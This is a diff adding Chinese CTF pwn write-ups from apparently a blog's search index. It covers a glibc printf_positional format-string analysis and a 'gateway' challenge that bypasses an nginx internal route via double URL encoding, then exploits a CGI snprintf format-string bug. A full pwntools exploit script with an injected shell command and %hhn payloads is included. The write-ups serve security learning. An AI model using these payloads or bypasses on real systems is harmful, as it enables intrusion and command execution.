+</li>
+</ul>
+<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png" class="">
+
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png" class="">
+
+<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
+<pre><code class="c">if (*f == L_(&#39;$&#39;))
+/* Oh, oh.  The argument comes from a positional parameter.  */
+    goto do_positional;
+JUMP (*f, step1_jumps);
+</code></pre>
+<pre><code class="c">do_positional:
+  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,
+                done, nspecs_done, lead_str_end, work_buffer,
+                save_errno, grouping, thousands_sep, mode_flags);
+</code></pre>
+<p>现在我们来看看用<code>payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png" class="">
+
+<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是 <code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code> 然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png" class="">
+
+<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
+<pre><code class="c">for (cnt = 0; cnt &lt; nspecs; ++cnt)
+    &#123;
+      /* If the width is determined by an argument this is an int.  */
+      if (specs[cnt].width_arg != -1)
+    args_type[specs[cnt].width_arg] = PA_INT;
+
+      /* If the precision is determined by an argument this is an int.  */
+      if (specs[cnt].prec_arg != -1)
+    args_type[specs[cnt].prec_arg] = PA_INT;
+
+      switch (specs[cnt].ndata_args)
+    &#123;
+    case 0:		/* No arguments.  */
+      break;
+    case 1:		/* One argument; we already have the
+               type and size.  */
+      args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;
+      args_size[specs[cnt].data_arg] = specs[cnt].size;
+      break;
+    default:
+      /* We have more than one argument for this format spec.
+         We must call the arginfo function again to determine
+         all the types.  */
+      (void) (*__printf_arginfo_table[specs[cnt].info.spec])
+        (&amp;specs[cnt].info,
+         specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],
+         &amp;args_size[specs[cnt].data_arg]);
+      break;
+    &#125;
+    
+--------------------------------------------------------------------------------------------------
+      for (cnt = 0; cnt &lt; nargs; ++cnt)
+    switch (args_type[cnt])
+      &#123;
+#define T(tag, mem, type)				\
+    case tag:					\
+      args_value[cnt].mem = va_arg (*ap_savep, type); \
+      break
+
+    T (PA_WCHAR, pa_wchar, wint_t);
+      case PA_CHAR:				/* Promoted.  */
+      case PA_INT|PA_FLAG_SHORT:		/* Promoted.  */
+#if LONG_MAX == INT_MAX
+      case PA_INT|PA_FLAG_LONG:
+#endif
+    T (PA_INT, pa_int, int);
+#if LONG_MAX == LONG_LONG_MAX
+      case PA_INT|PA_FLAG_LONG:
+#endif
+    T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, long long int);
+#if LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX
+# error &quot;he?&quot;
+#endif
+      case PA_FLOAT:				/* Promoted.  */
+    T (PA_DOUBLE, pa_double, double);
+      case PA_DOUBLE|PA_FLAG_LONG_DOUBLE:
+    if (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != 0))
+      &#123;
+        args_value[cnt].pa_double = va_arg (*ap_savep, double);
+        args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;
+      &#125;
+#if __HAVE_FLOAT128_UNLIKE_LDBL
+    else if ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != 0)
+      args_value[cnt].pa_float128 = va_arg (*ap_savep, _Float128);
+#endif
+    else
+      args_value[cnt].pa_long_double = va_arg (*ap_savep, long double);
+    break;
+      case PA_STRING:				/* All pointers are the same */
+      case PA_WSTRING:			/* All pointers are the same */
+    T (PA_POINTER, pa_pointer, void *);
+#undef T
+      default:
+    if ((args_type[cnt] &amp; PA_FLAG_PTR) != 0)
+      args_value[cnt].pa_pointer = va_arg (*ap_savep, void *);
+    else if (__glibc_unlikely (__printf_va_arg_table != NULL)
+         &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != NULL)
+      &#123;
+        args_value[cnt].pa_user = alloca (args_size[cnt]);
+        (*__printf_va_arg_table[args_type[cnt] - PA_LAST])
+          (args_value[cnt].pa_user, ap_savep);
+      &#125;
+    else
+      memset (&amp;args_value[cnt], 0, sizeof (args_value[cnt]));
+    break;
+      case -1:
+    /* Error case.  Not all parameters appear in N$ format
+       strings.  We have no way to determine their type.  */
+    assert ((mode_flags &amp; PRINTF_FORTIFY) != 0);
+    __libc_fatal (&quot;*** invalid %N$ use detected ***\n&quot;);
+      &#125;
+</code></pre>
+<p>**第一个 <code>switch</code>**：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
+<p>**第二个 <code>switch</code>**：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
+<p>最后会统一处理格式化说明符。</p>
+<pre><code class="c">/* Now walk through all format specifiers and process them.  */
+  for (; (size_t) nspecs_done &lt; nspecs; ++nspecs_done)
+    &#123;
+      ..............................
+</code></pre>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png" class="">
+
+<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了.&#x2F;pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png" class="">
+
+<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png" class="">
+
+<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>format string</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>webpwn</title>
+    <url>/2024/09/21/webpwn/</url>
+    <content><![CDATA[<h2 id="一、web与pwn的联系"><a href="#一、web与pwn的联系" class="headerlink" title="一、web与pwn的联系"></a>一、web与pwn的联系</h2><p>在某些 Web 服务中，会通过调用二进制程序来处理特定请求，尤其是在涉及动态内容生成、脚本执行、数据处理等场景时。以下是一些常见的例子：</p>
+<h4 id="1-CGI-Common-Gateway-Interface"><a href="#1-CGI-Common-Gateway-Interface" class="headerlink" title="1. CGI (Common Gateway Interface)"></a>1. <strong>CGI (Common Gateway Interface)</strong></h4><ul>
+<li><strong>概述：</strong> CGI 是一种通用的接口标准，允许 Web 服务器调用外部的二进制程序或脚本来生成动态内容。</li>
+<li><strong>调用方式：</strong> 当用户请求特定路径时，Web 服务器会通过 CGI 将请求转发给二进制程序（例如 C&#x2F;C++ 编写的可执行文件）。程序运行后将生成的输出（通常是 HTML）返回给用户。</li>
+<li><strong>示例：</strong> <code>httpd</code>、<code>nginx</code> 等服务器常通过 CGI 调用二进制文件，如 <code>/usr/lib/cgi-bin/</code> 中的程序。</li>
+</ul>
+<h4 id="2-FastCGI"><a href="#2-FastCGI" class="headerlink" title="2. FastCGI"></a>2. <strong>FastCGI</strong></h4><ul>
+<li><strong>概述：</strong> FastCGI 是 CGI 的增强版，通常用于调用长时间运行的二进制程序或脚本，以提高性能。</li>
+<li><strong>调用方式：</strong> Web 服务器将请求传递给 FastCGI 进程，该进程是一个长期运行的二进制程序，能快速处理多个请求，而不必每次请求都重新启动程序。</li>
+<li><strong>示例：</strong> PHP-FPM 就是一个常见的 FastCGI 进程管理器，它可以调用 PHP 解释器来处理请求。</li>
+</ul>
+<h4 id="3-后端服务调用"><a href="#3-后端服务调用" class="headerlink" title="3. 后端服务调用"></a>3. <strong>后端服务调用</strong></h4><ul>
+<li><strong>概述：</strong> 有些 Web 服务会在后台调用二进制程序来执行任务，例如图像处理、数据分析、或其他复杂计算。</li>
+<li><strong>调用方式：</strong> 通常通过系统调用（如 <code>exec</code> 或 <code>popen</code>）从 Web 应用程序（如 Python、Ruby、PHP 等）中调用二进制程序，并获取其输出结果。</li>
+<li><strong>示例：</strong> 图像处理库 ImageMagick 或者 FFMPEG 等工具经常在 Web 服务中被调用来处理用户上传的媒体文件。</li>
+</ul>
+<h4 id="4-嵌入式设备-Web-服务"><a href="#4-嵌入式设备-Web-服务" class="headerlink" title="4. 嵌入式设备 Web 服务"></a>4. <strong>嵌入式设备 Web 服务</strong></h4><ul>
+<li><strong>概述：</strong> 在一些嵌入式系统（如路由器、NAS 设备等）中，Web 界面通常用于配置设备，而这些界面可能会调用二进制程序来执行系统命令或获取状态信息。</li>
+<li><strong>调用方式：</strong> 嵌入式设备的 Web 服务器可能直接调用设备上的二进制文件来执行配置变更或获取系统状态。</li>
+<li><strong>示例：</strong> 路由器的管理界面可能调用二进制程序来重启设备或修改网络设置。</li>
+</ul>
+<h4 id="5-Server-Side-Includes-SSI"><a href="#5-Server-Side-Includes-SSI" class="headerlink" title="5. Server-Side Includes (SSI)"></a>5. <strong>Server-Side Includes (SSI)</strong></h4><ul>
+<li><strong>概述：</strong> SSI 是一种服务器端技术，允许在 HTML 文件中包含其他文件或执行命令行程序。</li>
+<li><strong>调用方式：</strong> 通过 SSI，可以在 HTML 中直接调用二进制程序，并将其输出嵌入到页面中。</li>
+<li><strong>示例：</strong> 例如，在 Apache 中，可以通过 <code>&lt;!--#exec cmd=&quot;path/to/program&quot;--&gt;</code> 来调用一个二进制程序并将其输出嵌入到 HTML 中。</li>
+</ul>
+<p>调用二进制程序的 Web 服务在动态内容生成和复杂任务处理时非常有用，尤其是在需要高效处理和利用已有二进制工具的情况下。使用这些技术时，可能会产生二进制的漏洞。</p>
+<h2 id="二、题目复现"><a href="#二、题目复现" class="headerlink" title="二、题目复现"></a>二、题目复现</h2><h3 id="1-gateway"><a href="#1-gateway" class="headerlink" title="1.gateway"></a>1.gateway</h3><p>以CGI产生的漏洞进行分析，这里分析时比较重要的是要在default文件里看Nginx配置信息。</p>
+<h4 id="Nginx配置信息"><a href="#Nginx配置信息" class="headerlink" title="Nginx配置信息"></a>Nginx配置信息</h4><pre><code class="nginx">listen 80 default_server;
+listen [::]:80 default_server;
+root /var/www/html;
+index index.html index.htm index.nginx-debian.html;
+server_name _;
+</code></pre>
+<p><strong>listen 80 default_server;</strong></p>
+<ul>
+<li>配置 Nginx 监听 <code>80</code> 端口，这是默认的 HTTP 端口。</li>
+<li><code>default_server</code> 表示这是默认的服务器块，当请求的主机名没有匹配到其他服务器块时，将使用此服务器块。</li>
+</ul>
+<p><strong>listen [::]:80 default_server;</strong></p>
+<ul>
+<li>这个指令与上面的类似，但它用于监听 IPv6 地址上的 <code>80</code> 端口。</li>
+</ul>
+<p><strong>root &#x2F;var&#x2F;www&#x2F;html;</strong></p>
+<ul>
+<li>定义服务器的根目录。当请求的 URI 没有指向具体文件时，Nginx 会在此目录中查找资源。</li>
+</ul>
+<p><strong>index index.html index.htm index.nginx-debian.html;</strong></p>
+<ul>
+<li>定义默认的主页文件列表。当用户访问一个目录时，Nginx 会依次查找这些文件作为首页。</li>
+</ul>
+<p><strong>server_name _;</strong></p>
+<ul>
+<li>设置服务器名。_ 表示匹配任何请求的服务器名。</li>
+</ul>
+<pre><code class="nginx">location / &#123;
+    # First attempt to serve request as file, then
+    # as directory, then fall back to displaying a 404.
+    try_files $uri $uri/ =404;
+&#125;
+
+location /cgi-bin/note_handler &#123;
+    internal;
+    proxy_set_header X-Forwarded-For 127.0.0.1;
+    proxy_pass http://127.0.0.1;
+&#125;
+
+    
+location /cgi-bin/ &#123;
+    if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123;
+        return 403;
+    &#125;
+    expires +1h;
+    limit_rate 10k;
+    root /usr/share;
+    fastcgi_pass unix:/var/run/fcgiwrap.socket;
+    fastcgi_index /cgi-bin/http;
+    include /etc/nginx/fastcgi_params;
+    #fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;
+&#125;
+
+location /cgi-bin/forward &#123;
+    proxy_set_header X-Forwarded-For 127.0.0.1;
+    proxy_pass http://127.0.0.1/cgi-bin/http?action=print;
+&#125;
+
+location /get_flag &#123;
+    alias /tmp/flag;
+    default_type text/plain;
+&#125;
+</code></pre>
+<p><strong>location &#x2F; { … }</strong></p>
+<ul>
+<li>这个 <code>location</code> 块用于定义如何处理根路径 <code>/</code> 下的请求。<ul>
+<li><code>try_files $uri $uri/ =404;</code>：首先尝试按文件路径处理请求，如果找不到相应的文件或目录，则返回 <code>404</code> 错误。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F;note_handler { … }</strong></p>
+<ul>
+<li>这个 <code>location</code> 块内部处理 <code>/cgi-bin/note_handler</code> 的请求，并通过 <code>proxy_pass</code> 将请求转发到 <code>http://127.0.0.1</code>。<ul>
+<li><code>internal;</code>：这个指令表示该路径是内部路径，不能直接从外部访问。</li>
+<li><code>proxy_set_header</code> 设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>，通常用于标识原始请求的 IP 地址。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F; { … }</strong></p>
+<ul>
+<li>这个块定义了对 <code>/cgi-bin/</code> 目录下的请求的处理。<ul>
+<li><code>if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123; return 403; &#125;</code>：如果请求的 URI 是 <code>/cgi-bin/note_handler</code>，则返回 <code>403 Forbidden</code>。</li>
+<li><code>expires +1h;</code>：设置响应缓存时间为1小时。</li>
+<li><code>limit_rate 10k;</code>：限制响应速率为 <code>10KB/s</code>。</li>
+<li><code>root /usr/share;</code>：定义此块的根目录为 <code>/usr/share</code>。</li>
+<li><code>fastcgi_pass</code> 和 <code>fastcgi_index</code> 指定了 FastCGI 处理脚本的位置。</li>
+<li><code>include /etc/nginx/fastcgi_params;</code> 包含了 FastCGI 的标准配置文件。</li>
+<li><code>fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;</code>：设置 <code>SCRIPT_FILENAME</code> 参数，指定 CGI 脚本的路径。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F;forward { … }</strong></p>
+<ul>
+<li>这个块处理 <code>/cgi-bin/forward</code> 请求，并将其代理到 <code>http://127.0.0.1/cgi-bin/http?action=print</code>。<ul>
+<li><code>proxy_set_header X-Forwarded-For 127.0.0.1;</code>：设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>。</li>
+<li><code>proxy_pass http://127.0.0.1/cgi-bin/http?action=print;</code>：将请求代理到指定的 URL。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;get_flag { … }</strong></p>
+<ul>
+<li>这个块处理 <code>/get_flag</code> 请求。<ul>
+<li><code>alias /tmp/flag;</code>：将请求 <code>/get_flag</code> 映射到 <code>/tmp/flag</code> 文件。</li>
+<li><code>default_type text/plain;</code>：将响应的内容类型设置为 <code>text/plain</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="cgi脚本信息"><a href="#cgi脚本信息" class="headerlink" title="cgi脚本信息"></a>cgi脚本信息</h4><img src="/2024/09/21/webpwn/image-20240921212314836.png" class="">
+
+<p>先是通过三个getenv函数获取环境变量。如果我们发起如下的请求</p>
+<pre><code class="list">http://example.com/cgi-bin/script?param1=value1&amp;param2=value2
+</code></pre>
+<p>该请求的参数会加入到服务器的环境变量，具体的环境变量值如下：</p>
+<ul>
+<li><code>REQUEST_METHOD</code>：<code>GET</code></li>
+<li><code>QUERY_STRING</code>：<code>param1=value1&amp;param2=value2</code></li>
+<li><code>SCRIPT_NAME</code>：<code>/cgi-bin/script</code></li>
+</ul>
+<p>后续的几个判断就是限制了各参数的长度，以及限制了用..来进行目录穿越的手段。其中比较重要的就是这个url_decode函数，其作用是进行url解码，也正是这个函数结合Nginx服务器的配置产生了漏洞。</p>
+<img src="/2024/09/21/webpwn/image-20240921212329176.png" class="">
+
+<p>后续先对请求方式进行判断，如果不是GET的话最后会返回<code>&lt;html&gt;&lt;title&gt;403 FORBIDDEN&lt;/title&gt;&lt;body&gt;Method not support.&lt;/body&gt;&lt;/html&gt;</code>这样的页面。后面的循环实现了逐个取出get的参数，其中解析了action以及content这两个参数。而最主要的漏洞也就是发生在content参数会用<code>snprintf(v14, (size_t)&quot;%s&quot;, content, v6);</code>来处理，这个函数的参数设置产生了错误，导致格式化字符串%s被当成了一个数字大小来作为存到v14缓冲区的字节数量，而content也就成了解析的格式化字符串，于是产生了格式化字符串漏洞。</p>
+<p>然后我们来看看前面有个check函数，这个函数也就是我们需要构造条件来绕过的一个检测函数。</p>
+<img src="/2024/09/21/webpwn/image-20240921212338234.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212346893.png" class="">
+
+<p>我们发现这里主要做了两个检测，也就是<strong>X-Forwarded-For</strong>这个http请求头字段要为127.0.0.1。而且s1，也就是之前获取的cgi脚本路径要为**&#x2F;cgi-bin&#x2F;note_handler<strong>。然而之前在nginx配置中&#x2F;cgi-bin&#x2F;note_handler有用</strong>internal<strong>来指定其不能被外部请求访问，绕不开这个就不能进行下一步利用，这该怎么办呢？这时候前面的</strong>url_decode<strong>就起了作用，我们可以把&#x2F;cgi-bin&#x2F;note_handler转成其url编码的形式传入（其实只用编码一个字符就能够绕过检测），此时能够通过如上check函数，因为s1是解码后的url。这里需要注意的是，由于http请求到达nginx服务器时会</strong>先进行一次url解码**，所以如果我们想要把r进行url编码，直接转成%72是不够的，因为一开始它就被解码然后进location块而过不了检测。我们需要再把%也进行url编码，把r转成%2572输入，那么cgi程序最后调用url_decode后就得到了我们想要的&#x2F;cgi-bin&#x2F;note_handler。</p>
+<img src="/2024/09/21/webpwn/image-20240921212357022.png" class="">
+
+<p>然后就是处理程序的主体逻辑了，使用之前与处理get参数相同的for循环来逐个获取以逗号分割的指令，实现了一个类似堆菜单题的操作。</p>
+<img src="/2024/09/21/webpwn/image-20240921212405705.png" class="">
+
+<p>从这个add方法中可以看出，每个add的chunk中都有一个指向下一个节点的next域（<code>*((_QWORD *)dest + 13)</code>这个位置），全局变量dest存的是头节点。</p>
+<img src="/2024/09/21/webpwn/image-20240921212414590.png" class="">
+
+<p>由于是每次释放掉链表头节点，每次都会更新头节点，所以不会有悬挂指针，就不存在UAF。</p>
+<img src="/2024/09/21/webpwn/image-20240921212422128.png" class="">
+
+<p>edit功能没啥用，改的内容和原来content里的内容相同。</p>
+<img src="/2024/09/21/webpwn/image-20240921212430271.png" class="">
+
+<p>print会遍历整个链表，可以展示每个节点的内容。</p>
+<img src="/2024/09/21/webpwn/image-20240921212438450.png" class="">
+
+<p>get_flag就是一个后门函数，不过这里把获取到flag的内容重定向到&#x2F;dev&#x2F;null丢弃了，直接调用也不会显示flag内容。</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>由于在CGI环境中，Web服务器（如Nginx）会将HTTP请求中的某些信息解析并传递给运行的CGI程序作为环境变量。我们这里看到的参数都是通过getenv传递的。所以如果我们像正常做pwn题那样直接对二进制程序进行分析，会发现少了服务器将http请求解析到环境变量这一环节，这时我们需要寻求别的方式来进行调试。</p>
+<p>解决方法其实也很容易想到，既然是getenv加载参数，那么我们可以在gdb中直接来设置环境变量，这样之后就是正常的本地环境漏洞分析了。需要注意的是，本地在设置环境变量时都是模拟服务器处理后的参数，比如我们要传**&#x2F;cgi-bin&#x2F;note_handle%2572<strong>，在调试时就要经过一层url解码，传入的是</strong>&#x2F;cgi-bin&#x2F;note_handle%72**。</p>
+<p>大致的调试方法如下：</p>
+<pre><code class="python">p = process(&quot;./http&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+payload = &quot;action=add,print&amp;content=%p%p%p&quot;
+gdb.attach(p,f&#39;&#39;&#39;
+        set env REQUEST_METHOD GET
+        set env QUERY_STRING &quot;&#123;payload&#125;&quot;
+        set env SCRIPT_NAME /cgi-bin/note_handle%72
+        set env HTTP_X_FORWARDED_FOR 127.0.0.1
+        b getenv
+        r
+        &#39;&#39;&#39;)
+</code></pre>
+<p>这时我们可能会遇到如下问题</p>
+<img src="/2024/09/21/webpwn/image-20240921212450571.png" class="">
+
+<p>首先猜测是地址对其的问题，这里rsi的值为0x7fffffffef86，rsi+rdx-0x40不是16字节对齐的，我们看看0x7fffffffef86附近的内存布局：</p>
+<img src="/2024/09/21/webpwn/image-20240921212457536.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212504437.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212510945.png" class="">
+
+<p>可以发现这个getenv返回的是一个指向环境变量地址的指针，而且环境变量依次存在这个栈段的高地址处。我们可以尝试构造环境变量时使其大小刚好满足对齐条件试试。我首先是尝试把query_string那个环境变量变长从而把后面的script_name弄对齐，但是发现不会改变script_name值的位置。那么就猜测这个环境变量是从高地址往低地址存的，换一下环境变量设置的顺序后再改payload长度。</p>
+<img src="/2024/09/21/webpwn/image-20240921212523016.png" class="">
+
+<p>此时就能不报上述错误继续调试，其实这里我在执行memcpy时rsi指针末位还是f，并没有对齐。这时可能就是原来rsi+rdx-0x40，也就是rsi+0x40这个地址已经越过了环境变量段，是一个不能访问的地址。而调换顺序后rsi+0x40仍然在环境变量这个可访问的地址当中。误打误撞也算是能够过了。（很有意思的是，gdb调试中可以继续，然而执行脚本的主程序的显示却是早早退出，显示403，但只要能够调试就行）。</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>为了方便起见，一开始可以直接在print函数上打断点,这样一进去执行一下就能看到格式化字符串漏洞的执行效果。</p>
+<pre><code class="python">gdb.attach(p,f&#39;&#39;&#39;
+        set env REQUEST_METHOD GET
+        set env SCRIPT_NAME /cgi-bin/note_handle%72
+        set env QUERY_STRING &#123;payload&#125;
+        set env HTTP_X_FORWARDED_FOR 127.0.0.1
+        b getenv
+        r
+        delete break 1
+        b *(0x000000000401C7A)
+        c
+        &#39;&#39;&#39;)
+</code></pre>
+<p>经过调试我们可以确定，我们控制的content中的内容偏移为10。（用AAAAAAAA%10$p测得）</p>
+<img src="/2024/09/21/webpwn/image-20240921212555410.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212614557.png" class="">
+
+<p>之后修改puts的got表为system就行。</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python"># -*- coding=utf-8 -*-
+#!/usr/bin/env python3
+# A script for pwn exp
+from pwn import *
+import os
+import sys
+
+context.os = &#39;linux&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+LOCAL = 0
+LIBC = 1
+REMOTE = 0
+elf_path = &#39;./http&#39;
+libc_path = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+code = ELF(elf_path)
+context.arch=code.arch
+
+
+r = lambda x: io.recv(x)
+ra = lambda: io.recvall()
+rl = lambda: io.recvline(keepends=True)
+ru = lambda x: io.recvuntil(x, drop=True)
+s = lambda x: io.send(x)
+sl = lambda x: io.sendline(x)
+sa = lambda x, y: io.sendafter(x, y)
+sla = lambda x, y: io.sendlineafter(x, y)
+ia = lambda: io.interactive()
+c = lambda: io.close()
+uu32    = lambda: u32(io.recvuntil(&quot;\xf7&quot;,drop=False)[-4:].ljust(4, b&quot;\x00&quot;))
+uu64    = lambda:u64(io.recvuntil(&quot;\x7f&quot;,drop=False)[-6:].ljust(8, b&quot;\x00&quot;))
+lg      = lambda s:io.success(&#39;\033[32m%s -&gt; 0x%x\033[0m&#39; % (s, eval(s)))
+li = lambda x: log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
+
+if len(sys.argv) == 1:
+    print (&quot;Welcome to  c0ke&#39;s simplified pwntools template!!!&quot;)
+    print (&quot;Usage : \n&quot;)
+    print (&quot;       python mode.py HOST PORT\n &quot;)
+    print (&quot;       python mode.py [0/1][debug]]\n &quot;)
+    exit()
+elif len(sys.argv)==2:
+    context.log_level = &#39;debug&#39;
+    if(sys.argv[1]== &#39;1&#39;):
+        LOCAL = 1
+    else:
+        LOCAL = 0
+else:
+    REMOTE = 1
+    server_ip = sys.argv[1]
+    server_port = int(sys.argv[2])
+
+
+
+# --------------------------func-----------------------------
+def db():
+    if (LOCAL):
+        gdb.attach(io,&#39;&#39;&#39;
+        b *0x0000000000401806
+
+
+        &#39;&#39;&#39;)
+        pause()
+
+def find_libc(func_name,func_ad):
+    p(func_name,func_ad)
+    global libc 
+    libc = LibcSearcher(func_name,func_ad)
+    libcbase=func_ad-libc.dump(func_name)
+    li(&#39;libcbase&#39;,libcbase)
+    return libcbase
+
+def cat_flag():
+    flag_header = b&#39;flag&#123;&#39;
+    sleep(1)
+    sl(&#39;cat flag&#39;)
+    ru(flag_header)
+    flag = flag_header + ru(&#39;&#125;&#39;) + b&#39;&#125;&#39;
+    exit(0)
+
+   
+
+
+
+# --------------------------exploit--------------------------
+def exploit():
+    li(&#39;exploit...&#39;)
+    code = &#39;cp /start.sh /tmp/flag&#39;
+    code = code + &#39;;&#39;
+    code = code.ljust(30, &#39;a&#39;) + &#39;;&#39;
+                                                                            
+    request = &quot;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=&#123;&#125;\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n&quot;.format(code)
+    request += &quot;Host: 127.0.0.1\r\n&quot;
+    request += &quot;Cache-Control: max-age=0\r\n&quot;
+    request += &quot;Upgrade-Insecure-Requests: 1\r\n&quot;
+    request += &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36\r\n&quot;
+    request += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n&quot;
+    request += &quot;X-Forwarded-For: 127.0.0.1\r\n&quot;
+    request += &quot;Accept-Encoding: gzip, deflate\r\n&quot;
+    request += &quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;
+    request += &quot;If-Modified-Since: Mon, 08 Jul 2024 04:01:37 GMT\r\n&quot;
+    request += &quot;Connection: close\r\n&quot;
+    request += &quot;\r\n&quot;
+
+
+    db()
+    li(&quot;request  --------------&gt;\n%s&quot;%request)
+    s(request.encode())
+    response = r(0x2000)
+    print(response.decode())
+
+
+
+    
+def finish():
+    ia()
+    c()
+
+
+# --------------------------main-----------------------------
+if __name__ == &#39;__main__&#39;:
+    if REMOTE:
+        io = remote(server_ip, server_port)
+        if LIBC:
+            libc = ELF(libc_path)
+        elf = ELF(elf_path)
+    else:
+        elf = ELF(elf_path)
+        if LIBC:
+            libc = ELF(libc_path)
+            io = elf.process()
+        else:
+            io = elf.process()
+
+    exploit()
+    finish()
+</code></pre>
+<h3 id="2-desktop"><a href="#2-desktop" class="headerlink" title="2.desktop"></a>2.desktop</h3><h4 id="xinetd信息"><a href="#xinetd信息" class="headerlink" title="xinetd信息"></a>xinetd信息</h4><p><code>xinetd</code> 配置文件是用于配置和管理 <code>xinetd</code> 服务的文件。<code>xinetd</code>（Extended Internet Service Daemon）是一个超级服务器守护进程，用于管理和启动各种 Internet 服务（如 FTP、Telnet 等），它可以监听指定的端口并在有连接请求时启动相应的服务。</p>
